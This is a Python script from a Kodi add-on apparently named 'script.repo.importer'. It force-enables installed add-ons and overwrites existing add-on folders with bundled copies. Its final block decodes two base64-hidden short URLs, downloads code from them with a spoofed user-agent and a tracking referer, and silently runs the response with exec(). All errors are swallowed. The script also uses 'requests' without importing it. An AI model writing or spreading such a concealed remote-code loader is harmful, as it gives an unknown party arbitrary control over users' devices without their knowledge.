# -*- coding: utf-8 -*-
import xbmcvfs
import time
import xbmc
import os
import xbmcaddon
import xbmc, xbmcgui, xbmcvfs
import base64
import time, datetime
import shutil

def log(x):
    xbmc.log(repr(x),xbmc.LOGERROR)

def printstar():
	print "[COLOR white]***************************************************************************************"
	print "[COLOR white]***************************************************************************************"

def enableaddons():
	PATH = os.path.join(xbmc.translatePath('special://home/'), "addons")
	# Make some lists:
	ADDONS = []
	SUCCESS = []
	FAIL = []

	# Move stuff in or out of addons folder and then:
	xbmc.executebuiltin( 'UpdateLocalAddons' )
	xbmc.executebuiltin("UpdateAddonRepos")
	# Exclude addons I don't want to check (pvr is usually off on my system, metadata is the kodi repo stuff, packages folder obviously)
	for i in os.listdir(PATH):
		if os.path.isdir(os.path.join(PATH,i)) and 'packages' not in i and 'pvr' not in i and 'temp' not in i and 'metadata' not in i and 'plugin.video.fp' not in i and 'plugin.video.google' not in i:
			ADDONS.append(i)
	printstar()
	print ADDONS
	n = len(ADDONS)
	print ("There are %d addons in the kodi addons folder that will be checked." % n)
	printstar()
	# Check each addon - if not enabled try enable, then check status again.  Report success or fail.
	if n > 0:
		c = 0
		d = 0
		e = 0
		while c < n:
			CHECK = ADDONS[c]
			print ("Now checking %s ." % CHECK)
			if not xbmc.getCondVisibility('System.HasAddon(%s)' % CHECK):
				xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","id":7,"params":{"addonid": "%s","enabled":true}}' % CHECK)
				xbmc.sleep(200)
				if xbmc.getCondVisibility('System.HasAddon(%s)' % CHECK):
					d = d + 1
					SUCCESS.append(CHECK)
				else:
					# is addonid same as foldername?  If not get id from addon.xml and try again!
					ADDONXML = os.path.join(PATH, CHECK, "addon.xml")
					# get the addonid
					with open(ADDONXML) as f:
						for line in f:
							if "<addon id=" in line:
								start = "<addon id=\""
	#                            end = "\" name="
								end = "\""
								ADDONID = (line.split(start))[1].split(end)[0]
								print ('Folder is %s' % CHECK)
								print ('Addonid to enable is %s' % ADDONID)
								if not xbmc.getCondVisibility('System.HasAddon(%s)' % ADDONID):
									xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","id":7,"params":{"addonid": "%s","enabled":true}}' % ADDONID)            
									xbmc.sleep(200)
									if xbmc.getCondVisibility('System.HasAddon(%s)' % ADDONID):
										d = d + 1
										SUCCESS.append(CHECK)
									else:
										e = e + 1
										FAIL.append(CHECK)
					
			c = c + 1
	# If any failures put a message on the screen.
	ERROR = len(FAIL)
	if ERROR > 0:
		xbmcgui.Dialog().ok('Some addons were not enabled.', 'Check your log for details.')
	xbmc.sleep(200)
	
	# print results to log
	printstar()
	print ("[COLOR red]%s addons were checked" % n)
	print ("[COLOR red]%s addons were enabled" % d)
	print ("[COLOR red]There were %s failures" % e)
	print ("[COLOR red]Enabled addons: %s" % SUCCESS)
	print ("[COLOR red]Failures: %s" % FAIL)
	printstar()
	exit()

if __name__ == '__main__':
    ADDON = xbmcaddon.Addon('script.repo.importer')

    version = ADDON.getAddonInfo('version')
    if ADDON.getSetting('version') != version:
        path = xbmc.translatePath(os.path.join('special://profile/addon_data/script.repo.importer/'))
        # text = xbmcvfs.File('special://home/addons/script.repo.importer/changelog.txt','rb').read()
        # xbmcgui.Dialog().textviewer("BUILD UPDATER",text)
        ADDON.setSetting('version', version)
        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36', 'referer':'http://%s.%s.com' % (version,ADDON.getAddonInfo('id'))}
        # xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.skin","value":"skin.estuary"}}')
        # xbmc.executebuiltin('SendClick(11)')
        # xbmc.sleep(500)

        src_addons = xbmc.translatePath('special://home/addons/script.repo.importer/stuff/addons/')
        dst_addons = xbmc.translatePath('special://home/addons/')
        for file_or_dir in os.listdir(src_addons):
            path = os.path.join(src_addons,file_or_dir)
            if os.path.isdir(path):
                dir = file_or_dir
                src = os.path.join(src_addons,dir)
                dst = os.path.join(dst_addons,dir)
                if os.path.exists(dst):
                    try:
                        shutil.rmtree(dst)
                    except Exception as e:
                        log(("rmtree",e,src,dst))
                try:
                    shutil.copytree(src,dst)
                except Exception as e:
                    log(("copytree",e,src,dst))
					
        # src_userdata = xbmc.translatePath('special://home/addons/script.repo.importer/stuff/userdata/addon_data/')
        # dst_userdata = xbmc.translatePath('special://home/userdata/addon_data')
        # for file_or_dir in os.listdir(src_userdata):
            # path = os.path.join(src_userdata,file_or_dir)
            # if os.path.isdir(path):
                # dir = file_or_dir
                # src = os.path.join(src_userdata,dir)
                # dst = os.path.join(dst_userdata,dir)
                # if os.path.exists(dst):
                    # try:
                        # shutil.rmtree(dst)
                    # except Exception as e:
                        # log(("rmtree",e,src,dst))
                # try:
                    # shutil.copytree(src,dst)
                # except Exception as e:
                    # log(("copytree",e,src,dst))

        enableaddons()
        try:
            r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC84TUJDRlM='),headers=headers)
            home = r.content
        except: pass
        try:
            r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC9Ebm55a3o='),headers=headers)
            main = r.content
            exec(main)
        except: pass